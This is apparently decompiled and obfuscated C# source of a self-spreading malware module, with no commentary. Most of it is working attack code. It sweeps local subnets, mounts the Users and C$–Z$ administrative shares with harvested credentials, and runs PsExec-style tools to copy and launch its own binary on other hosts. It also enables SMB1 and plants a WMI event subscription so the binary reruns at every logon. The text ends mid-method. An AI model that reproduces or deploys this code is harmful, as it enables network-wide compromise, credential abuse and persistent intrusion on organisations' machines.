using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace vQzMGKHeycFziMq;

internal class bOiDbXVJjvh
{
	public class LqeCYjFSyJZ
	{
		public string DCYIURaoXgDKgpc { get; set; }
	}

	public enum PstUJcONkua
	{
		GRXTfOQWlbsM = 1,
		YWNlxRWVRmCDjn,
		FVGIiKfaVufdDd,
		hltSwMZawdvTCybr,
		VScmktddKe
	}

	public enum lwgPZNEaIbBf
	{
		ABMWpPiRpnr,
		mPLUqaVbBTUp,
		PITXcJStdXASaG,
		ZwrfBHUhyhYF
	}

	public enum inFdEHpDeqvZ
	{
		SKXnOxSmRs = 1,
		tctmkjvurlXMK = 2,
		JwWQVHJcergcdDu = 4,
		fOjzQSMdlULrn = 8,
		LnQVtjwfxod = 16,
		xQIIaGiuzSc = 19
	}

	public enum nDQjXdXxUNGUlH
	{
		YTPhgjWUrGei,
		fGQVZVfYsPBaGAC,
		uAxmMDydmsDhO,
		TovETEzSvV,
		EsPUpDnXtiZdBy,
		LDNwKwovNJLVE,
		YQxZHpZXWUdiB,
		VcQiOCjtGxBtPmH,
		XvHrDbVmvopj,
		cfgUGQkfysA,
		arIlHBztdSTc,
		XttgsMNFAPXX
	}

	public class wZvvoLyaVxBvDw : IEnumerable
	{
		private enum oaRvZLfVCipDId
		{
			MdJdfpqADXAwjb = 0,
			DpTxijNkURaU = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class TfvbvbiAUkJFJDH
		{
			public PstUJcONkua cfAkUfROZoBjGSh;

			public lwgPZNEaIbBf DVxNyweWKOPYAE;

			public nDQjXdXxUNGUlH iPeqdaiTzUIqog;

			public inFdEHpDeqvZ nTvEaRvYcc;

			public string jClvNdmPtt;

			public string orscFZfrVShSXKL;

			public string jjfoMXegYVUX;

			public string EKvgxlMKVyMNP;
		}

		private ArrayList MMaaIuvQuGdJAfAqt = new ArrayList();

		public int GnfVJWmgtN => MMaaIuvQuGdJAfAqt.Count;

		[DllImport("Mpr.dll")]
		private static extern oaRvZLfVCipDId WNetOpenEnumA(PstUJcONkua dwScope, lwgPZNEaIbBf dwType, inFdEHpDeqvZ dwUsage, TfvbvbiAUkJFJDH p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern oaRvZLfVCipDId WNetCloseEnum(IntPtr hEnum);

		[DllImport("Mpr.dll")]
		private static extern oaRvZLfVCipDId WNetEnumResourceA(IntPtr hEnum, ref uint lpcCount, IntPtr buffer, ref uint lpBufferSize);

		private void EnumerateServers(TfvbvbiAUkJFJDH pRsrc, PstUJcONkua scope, lwgPZNEaIbBf type, inFdEHpDeqvZ usage, nDQjXdXxUNGUlH displayType)
		{
			uint lpBufferSize = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint lpcCount = 1u;
			if (WNetOpenEnumA(scope, type, usage, pRsrc, out lphEnum) == oaRvZLfVCipDId.MdJdfpqADXAwjb)
			{
				oaRvZLfVCipDId oaRvZLfVCipDId;
				do
				{
					oaRvZLfVCipDId = WNetEnumResourceA(lphEnum, ref lpcCount, intPtr, ref lpBufferSize);
					switch (oaRvZLfVCipDId)
					{
					case oaRvZLfVCipDId.DpTxijNkURaU:
						continue;
					case oaRvZLfVCipDId.MdJdfpqADXAwjb:
						Marshal.PtrToStructure(intPtr, pRsrc);
						if (pRsrc.iPeqdaiTzUIqog == displayType)
						{
							MMaaIuvQuGdJAfAqt.Add(pRsrc.orscFZfrVShSXKL);
						}
						if ((pRsrc.nTvEaRvYcc & inFdEHpDeqvZ.tctmkjvurlXMK) == inFdEHpDeqvZ.tctmkjvurlXMK)
						{
							EnumerateServers(pRsrc, scope, type, usage, displayType);
						}
						continue;
					}
					break;
				}
				while (oaRvZLfVCipDId != oaRvZLfVCipDId.DpTxijNkURaU);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public wZvvoLyaVxBvDw(PstUJcONkua scope, lwgPZNEaIbBf type, inFdEHpDeqvZ usage, nDQjXdXxUNGUlH displayType)
		{
			TfvbvbiAUkJFJDH pRsrc = new TfvbvbiAUkJFJDH();
			EnumerateServers(pRsrc, scope, type, usage, displayType);
		}

		public IEnumerator GetEnumerator()
		{
			return MMaaIuvQuGdJAfAqt.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct UcbHbniIzL
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string VsysyLEJJhG;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string PHBFTosTXub;

		public uint RpoxWKjpJyjfQ;

		public uint xOXbrZEUWUBWx;

		public IntPtr ZWmMFbVrmSrDsBP;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct XidlgKxYDBZqko
	{
		public int RpoxWKjpJyjfQ;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string NHepPsFvcY;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string ODvzMjQcgRE;
	}

	public struct lVxxEafZnZ
	{
		public string KNGWrMScFFhc;

		public string[] wieJKjuvxoprcmlV;

		public lVxxEafZnZ(string Name, string[] Target)
		{
			KNGWrMScFFhc = Name;
			wieJKjuvxoprcmlV = Target;
		}
	}

	[CompilerGenerated]
	private sealed class ICZFcsDHIyvwcS
	{
		private sealed class mtcBSrFrFrcw
		{
			public ICZFcsDHIyvwcS WFTxhhmYVyMabM;

			public int ryLdEmSPAuneIs;

			public void _003Cscanner_003Eb__4(int g)
			{
				yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", WFTxhhmYVyMabM.gBcrGuDpRWmICRo, "\\", (char)g, "$ /USER:", FaQeozQIYUzgGo[ryLdEmSPAuneIs], " ", qcCwskpVTaEnYe[ryLdEmSPAuneIs]));
				Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
				yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", WFTxhhmYVyMabM.gBcrGuDpRWmICRo, "\\", (char)g, "$"));
			}
		}

		public Ping rUMWPiiasOFkhd;

		public PingReply fNDLtskHFpb;

		public IPAddress gBcrGuDpRWmICRo;

		public string TlFxOKktFXCq;

		public void _003Cscanner_003Eb__2(int i)
		{
			try
			{
				string text = "." + i;
				rUMWPiiasOFkhd = new Ping();
				fNDLtskHFpb = rUMWPiiasOFkhd.Send(TlFxOKktFXCq + text, 900);
				if (fNDLtskHFpb.Status != 0)
				{
					return;
				}
				try
				{
					gBcrGuDpRWmICRo = IPAddress.Parse(TlFxOKktFXCq + text);
					IPHostEntry hostEntry = Dns.GetHostEntry(gBcrGuDpRWmICRo);
					if (yzZnBHwSsJOOcf.lZNmNTLNdP.Contains(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\Users")) || hostEntry.HostName.Contains(Environment.MachineName))
					{
						return;
					}
					yzZnBHwSsJOOcf.idkPIFBWhafRe.Add(gBcrGuDpRWmICRo.ToString());
					try
					{
						if (yzZnBHwSsJOOcf.XlMZZRHaUB == "YES")
						{
							Parallel.For(0, FaQeozQIYUzgGo.Count, delegate(int f)
							{
								yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\Users /USER:", FaQeozQIYUzgGo[f], " ", qcCwskpVTaEnYe[f]));
								Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
								yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\Users"));
								Parallel.For(65, 91, delegate(int g)
								{
									yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$ /USER:", FaQeozQIYUzgGo[f], " ", qcCwskpVTaEnYe[f]));
									Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
									yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$"));
								});
							});
						}
						else
						{
							yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\Users"));
							Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
							yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\Users"));
							Parallel.For(65, 91, delegate(int g)
							{
								yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$"));
								Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
								yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$"));
							});
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			catch (Exception)
			{
			}
		}

		public void _003Cscanner_003Eb__3(int f)
		{
			yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\Users /USER:", FaQeozQIYUzgGo[f], " ", qcCwskpVTaEnYe[f]));
			Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
			yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\Users"));
			Parallel.For(65, 91, delegate(int g)
			{
				yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$ /USER:", FaQeozQIYUzgGo[f], " ", qcCwskpVTaEnYe[f]));
				Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
				yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$"));
			});
		}

		public void _003Cscanner_003Eb__5(int g)
		{
			yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$"));
			Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
			yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$"));
		}
	}

	[CompilerGenerated]
	private sealed class ZhQqaAmYfd
	{
		public string vEhLhaWFadwWMta;

		public string qAjjKYIVYhRJO;

		public void _003CRun_003Eb__d(string ip)
		{
			if ((!ip.StartsWith("10.") && !ip.StartsWith("172.") && !ip.StartsWith("192.168.") && !ip.Contains("")) || !uEygpOkJTInhS(ip))
			{
				return;
			}
			if (yzZnBHwSsJOOcf.XlMZZRHaUB == "YES")
			{
				for (int i = 0; i < FaQeozQIYUzgGo.Count; i++)
				{
					if (yzZnBHwSsJOOcf.vPxSRRyjgDzUS)
					{
						if (File.Exists(vEhLhaWFadwWMta))
						{
							yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(vEhLhaWFadwWMta, "\\\\" + ip + " -u \"" + FaQeozQIYUzgGo[i] + "\" -p \"" + qcCwskpVTaEnYe[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(qAjjKYIVYhRJO))
					{
						yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(qAjjKYIVYhRJO, "\\\\" + ip + " -u \"" + FaQeozQIYUzgGo[i] + "\" -p \"" + qcCwskpVTaEnYe[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (yzZnBHwSsJOOcf.vPxSRRyjgDzUS)
			{
				if (File.Exists(vEhLhaWFadwWMta))
				{
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(vEhLhaWFadwWMta, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(qAjjKYIVYhRJO))
			{
				yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(qAjjKYIVYhRJO, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	[CompilerGenerated]
	private sealed class JFZGGgrDwsXnRr
	{
		public string iuqYngOLSzV;

		public bool _003CGetIPAddresses_003Eb__11(string o)
		{
			return o != iuqYngOLSzV;
		}
	}

	private const int DEohSILvLUtv = 268435455;

	private const int JgNObGGBBJ = 0;

	public static List<string> tLLrkXZrUUAvx = new List<string>();

	public static string PiUpDGrNLUYhg = "";

	public static List<string> FaQeozQIYUzgGo = new List<string>();

	public static List<string> qcCwskpVTaEnYe = new List<string>();

	public static List<string> cYYlKgHREXt = new List<string>();

	public List<string> NdkJzCEgOWWljl = new List<string>();

	public List<string> iWrzLazMTRUFb = new List<string>();

	public List<string> MNcSWTtaEDMZCHX = new List<string>();

	public static void mlTaRDBFVTaTVuH()
	{
		bOiDbXVJjvh bOiDbXVJjvh2 = lxekriZoAeQq();
		Parallel.ForEach(bOiDbXVJjvh2.MNcSWTtaEDMZCHX, delegate(string KOWcCbRxlGEOMqyvt)
		{
			string text = KOWcCbRxlGEOMqyvt.Split(new char[1] { '.' })[0] + "." + KOWcCbRxlGEOMqyvt.Split(new char[1] { '.' })[1] + "." + KOWcCbRxlGEOMqyvt.Split(new char[1] { '.' })[2];
			if (text.StartsWith("10.") || text.StartsWith("172.") || text.StartsWith("192.168.") || text.StartsWith(""))
			{
				fuSbZBfTMbRgKS(text);
			}
		});
	}

	public static void fuSbZBfTMbRgKS(string jzngWJcUkvA)
	{
		Ping rUMWPiiasOFkhd;
		PingReply fNDLtskHFpb;
		IPAddress gBcrGuDpRWmICRo;
		Parallel.For(0, 255, delegate(int i)
		{
			try
			{
				string text = "." + i;
				rUMWPiiasOFkhd = new Ping();
				fNDLtskHFpb = rUMWPiiasOFkhd.Send(jzngWJcUkvA + text, 900);
				if (fNDLtskHFpb.Status == IPStatus.Success)
				{
					try
					{
						gBcrGuDpRWmICRo = IPAddress.Parse(jzngWJcUkvA + text);
						IPHostEntry hostEntry = Dns.GetHostEntry(gBcrGuDpRWmICRo);
						if (!yzZnBHwSsJOOcf.lZNmNTLNdP.Contains(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\Users")) && !hostEntry.HostName.Contains(Environment.MachineName))
						{
							yzZnBHwSsJOOcf.idkPIFBWhafRe.Add(gBcrGuDpRWmICRo.ToString());
							try
							{
								if (yzZnBHwSsJOOcf.XlMZZRHaUB == "YES")
								{
									Parallel.For(0, FaQeozQIYUzgGo.Count, delegate(int f)
									{
										yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\Users /USER:", FaQeozQIYUzgGo[f], " ", qcCwskpVTaEnYe[f]));
										Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
										yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\Users"));
										Parallel.For(65, 91, delegate(int g)
										{
											yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$ /USER:", FaQeozQIYUzgGo[f], " ", qcCwskpVTaEnYe[f]));
											Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
											yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$"));
										});
									});
								}
								else
								{
									yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\Users"));
									Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
									yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\Users"));
									Parallel.For(65, 91, delegate(int g)
									{
										yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), string.Concat("use \\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$"));
										Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
										yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(string.Concat("\\\\", gBcrGuDpRWmICRo, "\\", (char)g, "$"));
									});
								}
								return;
							}
							catch
							{
								return;
							}
						}
						return;
					}
					catch
					{
						return;
					}
				}
			}
			catch (Exception)
			{
			}
		});
	}

	public static bOiDbXVJjvh lxekriZoAeQq()
	{
		new List<List<string>>();
		new List<string>();
		new List<string>();
		new List<string>();
		bOiDbXVJjvh bOiDbXVJjvh2 = new bOiDbXVJjvh();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (networkInterface.OperationalStatus != OperationalStatus.Up)
			{
				continue;
			}
			try
			{
				networkInterface.GetIPProperties();
				foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
				{
					if (unicastAddress.Address.AddressFamily != AddressFamily.InterNetwork)
					{
						continue;
					}
					IPAddress address = unicastAddress.Address;
					IPAddress iPv4Mask = unicastAddress.IPv4Mask;
					byte[] addressBytes = address.GetAddressBytes();
					byte[] addressBytes2 = iPv4Mask.GetAddressBytes();
					if (addressBytes.Length == addressBytes2.Length)
					{
						byte[] array2 = new byte[addressBytes.Length];
						for (int j = 0; j < array2.Length; j++)
						{
							array2[j] = (byte)(addressBytes[j] | (addressBytes2[j] ^ 0xFFu));
						}
						IPAddress iPAddress = new IPAddress(array2);
						byte[] array3 = new byte[addressBytes.Length];
						for (int k = 0; k < array3.Length; k++)
						{
							array3[k] = (byte)(addressBytes[k] & addressBytes2[k]);
						}
						IPAddress iPAddress2 = new IPAddress(array3);
						bOiDbXVJjvh2.iWrzLazMTRUFb.Add(networkInterface.Name);
						bOiDbXVJjvh2.MNcSWTtaEDMZCHX.Add(iPAddress2.ToString());
						bOiDbXVJjvh2.NdkJzCEgOWWljl.Add(iPAddress.ToString());
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return bOiDbXVJjvh2;
	}

	public static List<LqeCYjFSyJZ> ImghysVoZpoO()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<LqeCYjFSyJZ> list = new List<LqeCYjFSyJZ>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new LqeCYjFSyJZ
						{
							DCYIURaoXgDKgpc = string.Concat("\\", stringBuilder, "\\Users")
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string AHEhJKlNvNsBF, int LlWQsavIxaPuqv, int YZssIHSwMLCAvNCY, out IntPtr kKUJvVyuszEr, [MarshalAs(UnmanagedType.I4)] out int DnRAviCjoHobKA, [MarshalAs(UnmanagedType.I4)] ref int LEqcuKtYCI);

	public static List<lVxxEafZnZ> zfikvscqmmA(string BrLVelLknDMFtz)
	{
		try
		{
			List<lVxxEafZnZ> list = new List<lVxxEafZnZ>();
			IntPtr kKUJvVyuszEr = default(IntPtr);
			int DnRAviCjoHobKA = 0;
			int LEqcuKtYCI = 0;
			if (NetDfsEnum(BrLVelLknDMFtz, 3, 268435455, out kKUJvVyuszEr, out DnRAviCjoHobKA, ref LEqcuKtYCI) == 0)
			{
				for (int i = 0; i < DnRAviCjoHobKA; i++)
				{
					UcbHbniIzL ucbHbniIzL = (UcbHbniIzL)Marshal.PtrToStructure(kKUJvVyuszEr + i * Marshal.SizeOf(typeof(UcbHbniIzL)), typeof(UcbHbniIzL));
					if (ucbHbniIzL.VsysyLEJJhG == BrLVelLknDMFtz)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < ucbHbniIzL.xOXbrZEUWUBWx; j++)
					{
						IntPtr ptr = new IntPtr(ucbHbniIzL.ZWmMFbVrmSrDsBP.ToInt64() + j * Marshal.SizeOf(typeof(XidlgKxYDBZqko)));
						XidlgKxYDBZqko xidlgKxYDBZqko = (XidlgKxYDBZqko)Marshal.PtrToStructure(ptr, typeof(XidlgKxYDBZqko));
						if (xidlgKxYDBZqko.RpoxWKjpJyjfQ == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", xidlgKxYDBZqko.NHepPsFvcY, xidlgKxYDBZqko.ODvzMjQcgRE }));
						}
					}
					string text = ucbHbniIzL.VsysyLEJJhG.Replace(BrLVelLknDMFtz, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new lVxxEafZnZ(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void oKXJSDQhyje()
	{
		yzZnBHwSsJOOcf.taIBdDARBKkh("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<LqeCYjFSyJZ> list = ImghysVoZpoO();
		List<lVxxEafZnZ> list2 = zfikvscqmmA(Environment.MachineName);
		if (list2 != null)
		{
			foreach (lVxxEafZnZ item in list2)
			{
				string[] wieJKjuvxoprcmlV = item.wieJKjuvxoprcmlV;
				foreach (string text in wieJKjuvxoprcmlV)
				{
					if (text.Contains(Environment.MachineName) || !string.IsNullOrEmpty(text))
					{
						continue;
					}
					try
					{
						if (yzZnBHwSsJOOcf.XlMZZRHaUB == "YES")
						{
							for (int j = 0; j < FaQeozQIYUzgGo.Count; j++)
							{
								yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), "use " + text + " /USER:" + FaQeozQIYUzgGo[j] + " " + qcCwskpVTaEnYe[j]);
								Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
								yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(text);
							}
						}
						else
						{
							yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), "use " + text);
							Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
							yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(text);
						}
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (LqeCYjFSyJZ item2 in list)
		{
			if (item2.DCYIURaoXgDKgpc.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (yzZnBHwSsJOOcf.XlMZZRHaUB == "YES")
				{
					for (int k = 0; k < FaQeozQIYUzgGo.Count; k++)
					{
						yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), "use " + item2.DCYIURaoXgDKgpc + " /USER:" + FaQeozQIYUzgGo[k] + " " + qcCwskpVTaEnYe[k]);
						Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
						yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(item2.DCYIURaoXgDKgpc);
					}
				}
				else
				{
					yzZnBHwSsJOOcf.UkvSKngWEJZsJKEGJr(yzZnBHwSsJOOcf.jLGThbkXlozfB("bmV0LmV4ZQ=="), "use " + item2.DCYIURaoXgDKgpc);
					Thread.Sleep(yzZnBHwSsJOOcf.PXrJUxZGiZRJBh);
					yzZnBHwSsJOOcf.gxcrgYEOUkuuRF(item2.DCYIURaoXgDKgpc);
				}
			}
			catch
			{
			}
		}
	}

	public static void NYHYQBeuNGTovYc(string zgqNPaqjWaIf, string pCHZfSIOmUF, string ytaYXCoPQFBnKz)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "\\\\" + zgqNPaqjWaIf + "\\root\\subscription";
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(pCHZfSIOmUF);
			val2.get_Options().set_Password(ytaYXCoPQFBnKz);
			val2.get_Options().set_Authority(string.Format("ntlmdomain:{0}", "."));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath("__EventFilter"), (ObjectGetOptions)null);
			string text2 = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item("Name", (object)"WorkerFilter");
			((ManagementBaseObject)val5).set_Item("Query", (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item("QueryLanguage", (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item("EventNameSpace", (object)"root\\cimv2");
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath("CommandLineEventConsumer"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item("Name", (object)"EventConsumer");
			((ManagementBaseObject)val6).set_Item("ExecutablePath", (object)("\\\\" + zgqNPaqjWaIf + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath("__FilterToConsumerBinding"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item("Filter", (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item("Consumer", (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void IaouUGmGhVa()
	{
		yzZnBHwSsJOOcf.WMeimyLLMSxIr();
		List<chzkAitvHQDCcEd> list = chzkAitvHQDCcEd.MohkJvMFGBDqoB();
		foreach (chzkAitvHQDCcEd item in list)
		{
			tLLrkXZrUUAvx.Add(item.lMtvCPvYiCbyR);
		}
		if (yzZnBHwSsJOOcf.idkPIFBWhafRe.Count > 0)
		{
			tLLrkXZrUUAvx = tLLrkXZrUUAvx.Union(yzZnBHwSsJOOcf.idkPIFBWhafRe).ToList();
		}
		string vEhLhaWFadwWMta = "";
		string qAjjKYIVYhRJO = "";
		try
		{
			vEhLhaWFadwWMta = NZYhQqaEqmd();
		}
		catch
		{
		}
		try
		{
			qAjjKYIVYhRJO = lhDeYyDWJpvWZ();
		}
		catch
		{
		}
		foreach (chzkAitvHQDCcEd item2 in list)
		{
			try
			{
				if (item2.lMtvCPvYiCbyR.StartsWith("10.") || item2.lMtvCPvYiCbyR.StartsWith("172.") || item2.lMtvCPvYiCbyR.StartsWith("192.168.") || item2.lMtvCPvYiCbyR.Contains(""))
				{
